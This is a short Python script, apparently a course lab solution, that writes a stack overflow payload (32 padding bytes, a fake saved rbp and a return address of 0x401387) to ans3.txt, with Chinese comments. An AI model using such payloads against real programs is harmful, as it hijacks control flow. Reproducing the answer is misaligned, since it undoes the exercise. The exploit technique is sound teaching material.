from struct import pack

padding = b"A" * 32          # 覆盖 buf
fake_rbp = b"B" * 8          # 覆盖 saved rbp
ret_addr = pack("<Q", 0x401387)  # ⭐ 你刚才确定的地址（小端）

payload = padding + fake_rbp + ret_addr

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("payload written to ans3.txt, length =", len(payload))

